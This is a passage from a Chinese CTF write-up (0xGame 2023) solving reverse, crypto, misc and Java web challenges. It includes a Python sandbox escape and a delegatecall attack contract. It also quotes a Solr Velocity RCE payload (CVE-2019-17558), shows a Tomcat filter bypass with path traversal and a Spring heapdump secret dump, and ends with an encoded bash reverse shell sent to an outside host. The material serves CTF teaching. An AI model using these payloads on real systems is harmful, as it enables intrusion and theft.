[(114514, 1919810), (1842839172187 - 14742706156291/(6*(-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)) - (-1919816/3 + (-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3) + 14742706156291/(9*(-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)))**2/2 - 3*(-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)/2, -1919816/3 + (-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3) + 14742706156291/(9*(-1/2 - sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3))), (1842839172187 - 3*(-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)/2 - (-1919816/3 + 14742706156291/(9*(-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)) + (-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3))**2/2 - 14742706156291/(6*(-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)), -1919816/3 + 14742706156291/(9*(-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)) + (-1/2 + sqrt(3)*I/2)*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)), (1842839172187 - 3*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)/2 - (-1919816/3 + 14742706156291/(9*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)) + (56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3))**2/2 - 14742706156291/(6*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)), -1919816/3 + 14742706156291/(9*(56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3)) + (56606436278068528864/27 + 5*sqrt(92742209415608125067643)*I/9)**(1/3))]
```

其中第一个解为有效解。我们执行以下命令，即可获取 **flag**：

```shell
set x=114514&&set y=1919810&&java -Dbrand=0xGame -jar .\变量迷城.jar
```

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717315353.png)

#### 虚构核心

最后一道题，我们将 apk 文件拖入到 JADX 中，开始进行分析。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717320292.png)

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717320817.png)

反编译 **MainActivity** 类后，我们发现程序的逻辑如下：

- **checkFlag** 函数会解密资源中的 **dex** 文件，动态加载后调用其中的 **boolean com.ctf.a0xgame_5.FlagChecker.checkFlag(String input)** 函数，根据其返回值判断 **flag** 是否正确。

- **decrypt** 函数会根据 **key**，利用 **xor** 解密 **dex** 文件。

我们可以手动解密 **dex** 文件或直接复制出解密完成的 **dex** 文件。

在我们获取到解密的 **dex** 文件后，对其进行反编译，观察其内部逻辑。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717321619.png)

我们可以发现 **flag** 的开始和结束部分已知，但中间三个文本的 **md5** 值需与特定 **MD5** 值匹配。由于已知：

1. **flag** 格式固定
2. 三个 **md5** 值分别对应三段 **4** 个字符的十六进制文本。

我们可以选择暴力破解或查询 **MD5** 值对应的文本，以得到完整的 **flag**。以下网站会有所帮助：

[cmd5](https://www.cmd5.org/)

### Crypto

#### ECC

考点：

+ ECC概念
+ SageMath应用

ECC相关概念可以上网查查看，阿贝尔群下运算，具体概念这里不放了。
$$
我们设：r是加密方的生成随机数\\
k是私钥、K是公钥(K=k*G)\\
加密：C_1 = M+r*K = M+r*k*G\\
同时告诉解密方：C_2 = r*G\\
解密：M = C_1-r*k*G = C_1-k*C_2
$$
SageMath自带DLP问题求解的函数，直接用就行，要注意的是，加密的时候信息一般要编码到曲线上面，但是这题并没有这样做，就导致了C1，C2都不是在曲线上的点，但这个不要紧，照着题目逆向求出来就行了



```python
#sagemath
#part1:求私钥
q=1139075593950729137191297
a=930515656721155210883162
b=631258792856205568553568

G = (641322496020493855620384, 437819621961768591577606)
K = (781988559490437792081406, 76709224526706154630278)
E = EllipticCurve(GF(q),[0,0,0,a,b])
G = E.point(G)
K = E.point(K)
print(G.discrete_log(K))
#12515237792257199894
#part2:解密
from Crypto.Util.number import *
def add(P,Q):
	if P[0] != Q[0] and P[1] != Q[1]:
		t = ((Q[1]-P[1]) * inverse(Q[0]-P[0],q)) %q
	else:
		t = ((3*P[0]*P[0]+a) * inverse(2*P[1],q))%q

	x3 = t*t - P[0] - Q[0]
	y3 = t*(P[0] - x3) - P[1]
	return (x3%q, y3%q)

def mul(t, A, B=0):
    if not t: return B
    return mul(t//2, add(A,A), B if not t&1 else add(B,A) if B else A)


q=1139075593950729137191297
a=930515656721155210883162
b=631258792856205568553568

G = (641322496020493855620384, 437819621961768591577606)
K = (781988559490437792081406, 76709224526706154630278)
C_1=(926699948475842085692652, 598672291835744938490461)
C_2=(919875062299924962858230, 227616977409545353942469)
k = 12515237792257199894
tmp = mul(k,C_2)
tmp = (tmp[0],-tmp[1])
M = add(C_1,tmp)


print(long_to_bytes(M[0])+long_to_bytes(M[1]))
#b'Al1ce_L0ve_B0b'
```

#### LLL-FirstBlood

直接规约就可以得到结果

详细的原理这里看

[仙人指路1](https://blog.csdn.net/qq_42667481/article/details/118332181)

怕误人子弟，这里就不详细地写出更多概念，原理了。

LLL算法的核心是施密特约化，输入一组向量基，得到一组约化基。

使得我们可以通过一定的构造，去规约出某个向量(一组数字)，那么在这道题中，因为A是正交矩阵，经过LLL算法之后就被“约掉”了，所以我们可以直接得到题设的结果。

exp:

```python
from Crypto.Util.number import *
C=[[1528140902799730745476264672501768332416990282355490479242339131918301176698899635154781328839496210200676497333428, 2081687444435007467807250373278513114045272585243815458840083487459795021302180077490134099644993120009567147202772, 3080873409460299046339495750746632185307246572817534784703936044874106809413620470006445984962733721029566440253675, 3491734341995174183626991907292607070252197520631412767989879432598743851171175369180080355977574296558734415823458], [2359409535809048127331244699867147546817134802610067329431135227991488324148374065940238308147500809599395748756798, 3191196199160821446351036460385791985682645040446022512790815348810555748825420237291839170774872264097466183208742, 4665346530155386457242345394284286198347336281451530670818113876767736288089400119492317775648206643242839430899283, 5369350746042850276067380638571565496087948799720968959426256192923852197959381101839484196445995828389461004495917], [1641407111066265429602929560264443103285908072677065498760570514577412905392260182334706635555256537745902283191251, 2190536173399177167068153351271988931232272884028569669242062395087922275021628334797729266560930040116807133977244, 3127556759140845426132305699421707182108351516931881411928719802847628408656887897596425133523782526561471050447359, 3707239956529200159380870618471703921011276020439315706352183576289925263316580408968092016782483770373121972835410], [9883814543195849013523934427451407019514807606993414569626142656857168165339, 13190422499129347541373922929251088892868361241120937213742340947017395215646, 18832738552342488056498211782604832513006649329982003661701684946590064734701, 22323329751908690611034666068697427811613727429398087082295754189068333861152]]
C = Matrix(ZZ,C).LLL()
flag = b''
for i in list(C[0]):
    flag +=(long_to_bytes(-i))
print(flag)
#b'0xGame{8e4d5924dc4cd78f11c1eeb99e991ab3}'
```

#### LLL-SecondBlood

先推公式：
$$
题设：A*m+noise=c(modp)\\
展开：A*m+noise=c+k*p\\
构造：A*m-c+k*p=-noise\\
可以发现左边大部分是已知参数，右边是较小的未知质数
$$
那么我们可以构造这样一个矩阵：

![Lattice](C:\Users\Administrator\Desktop\Lattice.png)

直接对右边这个构造的矩阵进行规约就好，得到的结果就是下面的矩阵，详细原理在上边。

exp:

```python
from Crypto.Util.number import *
q = 9342426601783650861020119568565656404715236059903009041977149778244153930435908024696666887269890479558473622355346816236972767736577737332173213722012253
mask = [6237128445236992920577225644858662677575951126467888858782461334057970069468925833844231116647406833999142659751374620280213290736114576089069396331226747, 6368031389213953889417545256750169233725975229197446803885029159767701479445576860704561593200907482372690851152126782391126462547524526631934408981070841, 5106473460982791188578285397420642137630347289252852045044021197988607082777231839839730169682158507822078412449827976663385282021916120837408192506341443, 6318090842950331228033349517542810123596316850353637421587264886413877142612686177796023049304908696413386218992511112752788640732410845589679820003047667]
c_ = [3823539664720029027586933152478492780438595004453489251844133830947165342839393878831914879334660250621422877333022321117120398528430519794109624186204492, 1721659645750224819953244995460589691120672649732560768435214608167861246790136217219349234604724148039910656573436663379375048145045443527267790379816425, 668633520079344839648950502380059311916108468801009386138810324259146523323704014491547148973835774917331333581475920804677395949854411894556705238578896, 497860586379981076499130281851986010889356253371192266267220334713415782402939318483926418213877341511996918189750595755372560345085899109305344338944066]

c = [i for i in c_]
mask.append(1)
mask.append(0)
tmp = [[0 for i in range(len(c)+2)] for _ in range(len(c))]
tmp.append(mask)

for i in range(len(c)):
    tmp[i][i]=q
c.append(0)
c.append(pow(2,341))
tmp.append(c)

tmp =matrix(ZZ,tmp) 
tmp = tmp.LLL()
print(long_to_bytes(-tmp[0][4]))
#b'0xGame{19255b5c7b19c790e28d87c8a8bb1d33}'
```

以上是正解

下面是邪道速通:

[Coppersmith](https://www.cnblogs.com/oyrd/p/15836757.html)

因为未知量的位数都比较小，直接考虑使用多元Coppersmith，这里解释一下多元Coppersmith的思想和作用:

我们想要在有限域中解方程，可以通过展开和一定的方式换到整数域上，把问题变成简单的解方程问题（利用牛顿迭代法），然后再利用LLL算法去对构造的数学式子进行求解。

总而言之就是，实现有限域求根的算法（前提是这个根必须要比模数小很多）。因为求根的时候用到了LLL算法去规约基向量，得到的结果也是一组基（性质更好的），这种问题就被称之为SVP（最短向量）问题。

同理的还有CVP,HNP这些，在将来的格密码学习中会经常打交道，这里就不误人子弟了。

```python
import itertools
from Crypto.Util.number import *

def small_roots(f, bounds, m=1, d=None):
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()

    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m+1):
        base = N^(m-i) * f^i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1/factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B*monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots
    return []
q = 9342426601783650861020119568565656404715236059903009041977149778244153930435908024696666887269890479558473622355346816236972767736577737332173213722012253
mask = [6237128445236992920577225644858662677575951126467888858782461334057970069468925833844231116647406833999142659751374620280213290736114576089069396331226747, 6368031389213953889417545256750169233725975229197446803885029159767701479445576860704561593200907482372690851152126782391126462547524526631934408981070841, 5106473460982791188578285397420642137630347289252852045044021197988607082777231839839730169682158507822078412449827976663385282021916120837408192506341443, 6318090842950331228033349517542810123596316850353637421587264886413877142612686177796023049304908696413386218992511112752788640732410845589679820003047667]
c_ = [3823539664720029027586933152478492780438595004453489251844133830947165342839393878831914879334660250621422877333022321117120398528430519794109624186204492, 1721659645750224819953244995460589691120672649732560768435214608167861246790136217219349234604724148039910656573436663379375048145045443527267790379816425, 668633520079344839648950502380059311916108468801009386138810324259146523323704014491547148973835774917331333581475920804677395949854411894556705238578896, 497860586379981076499130281851986010889356253371192266267220334713415782402939318483926418213877341511996918189750595755372560345085899109305344338944066]


A = mask[0]
c = c_[0]
PR.<x,noise> = PolynomialRing(Zmod(q))
f = A*x - c + noise
roots = small_roots(f,(2^320,2^50),2,3)
print(roots)
#[(404417766109752774365993311026206252937822359426120081323087457724287886115277329019989616964477, 585427539127961)]

```

#### Matrix

考研真题：大一新师傅的练习册上就有解法的。
$$
已知A^{secret}=C\\
通过相似矩阵得：A=P^{-1}*B*P\\
那么问题就变成:A^{secret}=(P^{-1}*B*P)^{secret}=C\\
对中间的式子展开得到:P^{-1}*B^{secret}*P\\
其中B是对角矩阵，问题就变成了求对角元素上面的离散对数问题\\
那么之后参照上周的解法就可以了。
$$


exp:

```python

#sage
A=[[12143520799533590286, 1517884368, 12143520745929978443, 796545089340, 12143514553710344843, 28963398496032, 12143436449354407235, 158437186324560, 12143329129091084963, 144214939188320, 12143459416553205779, 11289521392968],[12143520799533124067, 1552775781, 12143520745442171123, 796372987410, 12143514596803995443, 28617862048776, 12143437786643111987, 155426784993480, 12143333265382547123, 140792203111560, 12143460985399172467, 10983300063372],[12143520799533026603, 1545759072, 12143520746151921286, 781222462020, 12143514741528175043, 27856210942560, 12143440210529480891, 150563969013744, 12143339455702534403, 135941365971840, 12143463119774571623, 10579745342712],[4857408319806885466, 2428704161425648657, 12143520747462241175, 758851601758, 12143514933292307603, 7286139389566980165, 9714738936567334300, 144947557513044, 12143346444338047691, 130561054163540, 4857352974113333366, 2428714303424782417],[12143520799533339320, 1476842796, 12143520749060275613, 733281428880, 12143515144091549812, 25896324662208, 12143446129977471347, 139126289668080, 12143353609086952433, 125093278125816, 12143467808884068695, 9705993135696],[3469577371288079926, 5204366058378782250, 12143520750775862343, 706665985740, 12143515359139397843, 24876891455539, 12143449149385190675, 5204499435641729607, 1734628523990131469, 119757210113970, 12143470097256549947, 9282407958928],[10986995009101166671, 1734788687033207505, 12143520752514668698, 680173911560, 12143515570582515443, 23883386182656, 12143452072344092516, 10408859957710764174, 8673790006740000925, 4047954924507284041, 12143472277719610437, 8879790035168],[12143520799534210329, 8095680534365818753, 12143520754224346525, 6071761054204856029, 12143515774342357443, 22931775530664, 12143454859049102627, 122586336122081, 12143373761302849103, 109840689548590, 8095634066844843878, 8500892291801],[2428704159899526175, 7286112481016467893, 12143520755876491019, 629765964828, 12143515968446948123, 9714838668887734012, 4857345013259425502, 117630592711632, 12143379764863568374, 105318302849760, 2428659620509049335, 7286120625945355053],[7286112479717322389, 7286112480971640825, 12143520757456628435, 606320684970, 12143516152115449139, 4857429497934652454, 4857347490735050126, 112978994964264, 12143385390297217523, 101086824360217, 7286069740980100293, 7286120294834973633],[7727695054246476847, 1202487728, 12143520758958480293, 584144077140, 12143516325240923843, 20377952745696, 12143462294760579275, 108622249048560, 12143390651947217363, 97133513961120, 12143479741445599772, 8831658996900830432],[12143520799535388887, 1161628182, 12143520760380594623, 563225247585, 12143516488091679443, 19626876325056, 12143464472820678035, 104545135017180, 12143395570399006523, 93441517429260, 12143481309754543787, 7218375794633]]
enc=[[11285847990515095003, 7585413350741918021, 11658254512436412666, 477577914899276103, 2941386515764607825, 11283325421744133699, 4096971712575507616, 8118672870538606033, 2377937081025778041, 6576171711896495163, 6152554374963853172, 5022013484610428974], [8354008012616001452, 7787447107046065118, 9504997911333967278, 1082773427768571094, 6015520658629219637, 11244285744740006951, 4493944053220750368, 3504246247470690014, 1738582001618280397, 2330057776906622572, 3043456814665571080, 2981613454022714952], [2508674373714509177, 3544963739532775937, 7952732753025175616, 11161786730565526285, 3397123486689639675, 6454135592624912854, 6613201018024296927, 9748485344986779929, 1819761609989340766, 1259944825407465767, 1596049024644778041, 7769939905324967788], [4200851163596876950, 11960539098651202761, 3303721151143544462, 2532304102428121556, 11083895221097319129, 1171933471304558017, 1549099593543874478, 6088238862927163233, 6459553630361959801, 947358195425767572, 2090533922210134578, 9023030120605201052], [2271102089902208138, 1614812525306266829, 1546249462332047661, 3168333397191737100, 7678980468150522028, 3128939172985153696, 1146041044751755224, 11870173227065140617, 8351303466095252790, 694704483676649448, 7944218023016968278, 583421745603756386], [10309472503110333289, 1100598261990718822, 10235859400888405310, 910925705831020921, 10771855884237562064, 9970830255165655653, 11678899608458971536, 4368822164222204233, 3104861419162339779, 4540709628196554222, 7851809145727500968, 12086896840826708824], [10973051751637593366, 5039073157846327641, 4855314857834773443, 4416954195828423951, 8243966437000815560, 8250554263390748131, 8093181066366682440, 1145520354143718292, 294729013023637045, 10115389386419597159, 2767140395261835843, 6724257139233017485], [6878768250003631244, 10834164422364241529, 6946589221005878489, 539734218479521833, 2691724062063066048, 3989403041446358401, 815244541494093987, 11168528286389981272, 2021358468726921955, 1123433019094267521, 524639025046508882, 5720273332497702547], [6688451244183880831, 10892730373179989558, 6987453292894341174, 5572212176769878684, 11332149024403380575, 3944612864568504791, 6768594304071589280, 10526434024562201079, 10241323610053039912, 1120473558410865753, 306153635148226248, 3606666063074222104], [7556871914690327290, 11353594909211427742, 747771112781361153, 1245068803956910299, 2831489557155431404, 1800035620948876551, 1050411779595241927, 5665981688041778089, 2028968510484240787, 4386552235402890530, 10334391443650474796, 3883841302951550608], [4485787817401669404, 184501191500952934, 3690661645276970957, 6263309802498749034, 6484490370652685031, 9743108369653588026, 3045941510087387269, 5870433915209047275, 4679598273992216016, 11839352681285251516, 4957980185504231911, 7925596893607015470], [1000449712878466719, 7022601702937838844, 1095849907482791166, 11989051568709522226, 6768031250066783733, 185945517026191241, 4280928696740160411, 5633542561098902406, 10176177574499086410, 5782837249861240943, 7406530879613861823, 1971858224839520916]]
p=12143520799543738643
A = matrix(GF(p), A)
enc = matrix(GF(p), enc)
B,P = A.eigenmatrix_right()
P_inv = P.inverse()
assert P*B*P_inv == A
B_=((P_inv*enc*P)[0])[0]
b=(B[0])[0]
x=discrete_log(mod(B_,p),mod(b,p))
print(x)
#6208835615336459559
#md5后交一下flag就行
```

#### Overflow

签名用的是ElGamal算法，这里这样放出这种题，理由如下：

+ 了解一下ElGamal算法的特点
+ 适应代码审计（有些时候题目代码很长，很容易让人感到害怕）

签名的时候没有对消息做校验，那么导致了我们的签名可以溢出被模数消掉，直接看WP吧，摆烂了。

核心的考点其实不难，只要细心就好了。

exp:

```python

from pwn import *
from Crypto.Util.number import *
io = remote('0.0.0.0',10002)
io.recvuntil(b'key:\n')
pub = eval(io.recvline())
io.recvuntil(b'>')
msg = long_to_bytes(bytes_to_long(b'0xGame')+pub[0]-1)
io.sendline(msg)
io.recvuntil(b'r=')
r = int(io.recvline())
io.recvuntil(b's=')
s = int(io.recvline())
io.recvuntil(b'flag.\n')
io.sendline(str(r).encode())
io.sendline(str(s).encode())
io.interactive()
io.close()
#b'0xGame{24b6edfdc07d71311774ed15248f434e}'
```

### Misc

#### Miversc

先用ook和brainfuck之间的对应关系得到原始的brainfuck代码

```
>++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>++++++++.>>+++++.>----..+++.<<<<----.<.>>>>>+.----.<.----.>+++++++.<++++.<<<<.>>>>++++.+++++.++.>++.-.<<<<<.>>>>>.<--------.---.<<<<.>>>>+.++++++.-----------.++++++.[>]+[[-]<]>,<++++++[->--------<]>,<++++++++++[->------------<]>,-<+++++++[->----------<]>,--<+++++[->-------------------<]>,+<++++++++++[->-----------<]>,-<++++++++++[->----------<]>,---<++++++++++[->------------<]>,+<+++++[->---------------<]>,+++<++++++++++[->------------<]>,<+++++[->-----------------------<]>,<++++[->-----------------------------<]>,<+++++[->-------------------<]>,--<++++++++[->----------<]>,-<++++++++++[->----------<]>,++<++++++++++[->------------<]>,-<++++++++++[->----------<]>,<++++++[->-------------------<]>,<+++++[->-----------------------<]>,-<++++++++++[->----------<]>,<+++++[->-------------------<]>,+<++++++++[->----------<]>,-<++++++++++[->-----------<]>,<+++++[->---------------<]>,<+++[->-----------<]>,<+++++[->-------------------------<]++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>++++++.>----.<-----.>-----.<<<<<.>>>>>++.++++++++++.<<<<<.>>>>>++++.<+++++++.-------.>---.<<<<<.>>>>>+++++.----------.++++++.<<<<<.>>>>++++++++.+++++.++.>.-.
```

然后搜索brainfuck基本语法再来看这段代码即可知道只是非常简单的比较，每一轮比较的结果是当前cell和下一个cell都为0

flag:

```
0xGame{Just_Reverse_OoK!}
```

#### 高数大师

使用sympy一直算导数积分就可以了

```
from pwn import *
import sympy

r = remote('124.220.8.243', 11451)
def solve(equation):
    equ = equation[:-4].strip()
    method = equation[-3]
    x = sympy.Symbol('x')
    if(method == 'd'):
        derivative = sympy.diff(equ, x)
        return derivative
    elif(method == 'i'):
        derivative = sympy.integrate(equ, x)
        return derivative

r.recvuntil(b'\n\n\n')
r.sendline()
for _ in range(300):
    print(_)
    equ = r.recvline().decode().split('>')[1]
    answer = solve(equ)
    r.recvuntil(b'your answer > ')
    r.sendline(str(answer))
    r.recvline()
r.interactive()
```

#### 你 好

修改了正常输出而没有修改报错输出，所以可以直接让程序报错外带flag

```
raise Exception(flag)
```

非预期解:

```
breakpoint()
```

然后输入python代码，比如

```
__import__('os').system('/bin/sh')
```

#### 0xcallsino

使用delegatecall修改变量是根据插槽位置来修改的特性来修改casinoaddr导致合约调用我们自己部署的攻击合约的setnumber函数

```
pragma solidity ^0.8.0;

interface casino {
    function setcasino(uint _number) external;
}

contract Attack {
    address casinoaddr;
    uint target;
    uint number;

    casino cs;

    constructor(address _addr) {
        cs = casino(_addr);
    }

    function attack() public {
        cs.setcasino(uint(uint160(address(this))));
        cs.setcasino(1);
    }

    function setnumber(uint _number) public {
        number = _number;
        target = _number;
    }
}
```

#### 我去，黑客

第一个问题:攻击者所使用的cve编号

翻看流量可以找到执行命令的部分

![image-20231022214213726](../../../C:\Users\16334\AppData\Roaming\Typora\typora-user-images\image-20231022214213726.png)

payload:

```
/solr/demo/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27ls%20-al%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end
```

搜索payload内容可得知是CVE-2019-17558

第二个问题:受害者机器的hostname

还是命令执行的部分

![image-20231022214434807](../../../C:\Users\16334\AppData\Roaming\Typora\typora-user-images\image-20231022214434807.png)

得到答案:b1574d1963ff

第三个问题:接收反弹shell的 ip:port

还是命令执行的部分

![image-20231022214553915](../../../C:\Users\16334\AppData\Roaming\Typora\typora-user-images\image-20231022214553915.png)

得到答案:192.168.207.1:2333

第四个问题:/tmp/success.txt的内容

在反弹shell附件找，可以发现shell里的流量

![image-20231022214708446](../../../C:\Users\16334\AppData\Roaming\Typora\typora-user-images\image-20231022214708446.png)

得到答案:HACKEDLOL

拼接即可

![image-20231022214814988](../../../C:\Users\16334\AppData\Roaming\Typora\typora-user-images\image-20231022214814988.png)

## Week 4

### Web

> Week 4 算是一个 Java 安全专题, 不过并没有考一些对新生来说比较深入复杂的东西例如各种 gadget (利用链) 的原理
>
> 题目考的都是一些常见的 Java 知识点, 比如很经典的传入 Runtime.exec 的命令需要编码, pom.xml 和 WEB-INF 的作用, ysoserial 工具的使用等等
>
> Web 方向以后无论是打 CTF 还是搞安全研究/红队攻防, 都会或多或少接触到一些 Java 安全的内容, 希望对 Web 感兴趣的同学能够认真消化本周题目中涉及到的知识点~

#### spring

考点: Spring Actuator heapdump 利用

根据 index 页面的提示可以知道为 spring actuator

参考文章: https://xz.aliyun.com/t/9763

访问 `/actuator/env` 可以发现 app.username 和 app.password 这两个环境变量

![image-20230930175030210](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202311021207572.png)

app.username 提示 flag 就在 app.password 里面, 但是它的 value 全是星号, 这里其实被 spring 给隐藏了

spring actuator 默认会把含有 password secret 之类关键词的变量的值改成星号, 防止敏感信息泄露

但是我们可以通过 `/actuator/heapdump` 这个路由去导出 jvm 中的堆内存信息, 然后通过一定的查询得到 app.password 的明文

https://github.com/whwlsfb/JDumpSpider

或者用其它工具比如 Memory Analyze Tool (MAT) 也行

```bash
$ JDumpSpider java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
......
===========================================
OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
server.port = null
management.endpoints.web.exposure.exclude = shutdown,refresh,restart
app.password = 0xGame{1abbac75-e230-4390-9148-28c71e0098b9}
app.username = flag_is_the_password

......
```

用 MAT 的话查询语句如下

```sql
SELECT * FROM java.util.LinkedHashMap$Entry x WHERE(toString(x.key).contains("app.password"))
```

#### auth_bypass

考点: Tomcat Filter 绕过 + Java 任意文件下载搭配 WEB-INF 目录的利用

题目附件给了 AuthFilter.java 和 DownloadServlet.java

DownloadServlet 很明显存在任意文件下载, 但是 AuthFilter 限制不能访问 `/download` 路由

```java
if (request.getRequestURI().contains("..")) {
    resp.getWriter().write("blacklist");
    return;
}

if (request.getRequestURI().startsWith("/download")) {
    resp.getWriter().write("unauthorized access");
} else {
    chain.doFilter(req, resp);
}
```

根据网上的文章可以知道, 直接通过 getRequestURI() 得到的 url 路径存在一些问题, 比如不会自动 urldecode, 也不会进行标准化 (去除多余的 `/` 和 `..`)

这里 `..` 被过滤了, 所以直接访问 `//download` 就能绕过, 后面目录穿越下载文件的时候可以将 `..` 进行一次 url 编码

然后可以通过 `//download?filename=avatar.jpg` 下载文件, 但是无法读取 `/flag` (提示 Permission denied), 那么很明显需要 RCE

根据题目描述, 网站使用 war 打包

这个 war 其实也就相当于压缩包, Tomcat 在部署 war 的时候会将其解压, 而压缩包内会存在一个 WEB-INF 目录, 目录里面包含编译好的 .class 文件以及 web.xml (保存路由和类的映射关系)

下载 web.xml

```
//download?filename=%2e%2e/WEB-INF/web.xml
```

xml 内容

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

    <servlet>
        <servlet-name>IndexServlet</servlet-name>
        <servlet-class>com.example.demo.IndexServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>DownloadServlet</servlet-name>
        <servlet-class>com.example.demo.DownloadServlet</servlet-class>
    </servlet>
    <servlet>
        <servlet-name>EvilServlet</servlet-name>
        <servlet-class>com.example.demo.EvilServlet</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>IndexServlet</servlet-name>
        <url-pattern>/</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>DownloadServlet</servlet-name>
        <url-pattern>/download</url-pattern>
    </servlet-mapping>
    <servlet-mapping>
        <servlet-name>EvilServlet</servlet-name>
        <url-pattern>/You_Find_This_Evil_Servlet_a76f02cb8422</url-pattern>
    </servlet-mapping>
    
    <filter>
        <filter-name>AuthFilter</filter-name>
        <filter-class>com.example.demo.AuthFilter</filter-class>
    </filter>

    <filter-mapping>
        <filter-name>AuthFilter</filter-name>
        <url-pattern>/*</url-pattern>
    </filter-mapping>
</web-app>
```

存在 EvilServlet, 映射的路由为 `/You_Find_This_Evil_Servlet_a76f02cb8422`

根据网上文章的知识点, 通过包名 (com.example.demo.EvilServlet) 构造对应的 class 文件路径并下载

```
//download?filename=%2e%2e/WEB-INF/classes/com/example/demo/EvilServlet.class
```

用 JD-GUI 或者其它 Java class 反编译工具打开

```java
import java.io.IOException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class EvilServlet extends HttpServlet {
  protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {
    String cmd = req.getParameter("Evil_Cmd_Arguments_fe37627fed78");
    try {
      Runtime.getRuntime().exec(cmd);
      resp.getWriter().write("success");
    } catch (Exception e) {
      resp.getWriter().write("error");
    } 
  }
}
```

直接 POST 访问 `/You_Find_This_Evil_Servlet_a76f02cb8422` 传个参就能执行命令

最后因为没有回显, 需要反弹 shell 或者通过 curl + burp collaborator 外带 flag

```
POST /You_Find_This_Evil_Servlet_a76f02cb8422 HTTP/1.1
Host: 127.0.0.1:50042
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 143

Evil_Cmd_Arguments_fe37627fed78=bash+-c+{echo,YmFzaCAtaSA%2bJiAvZGV2L3RjcC9ob3N0LmRvY2tlci5pbnRlcm5hbC80NDQ0IDA%2bJjE%3d}|{base64,-d}|{bash,-i}
```

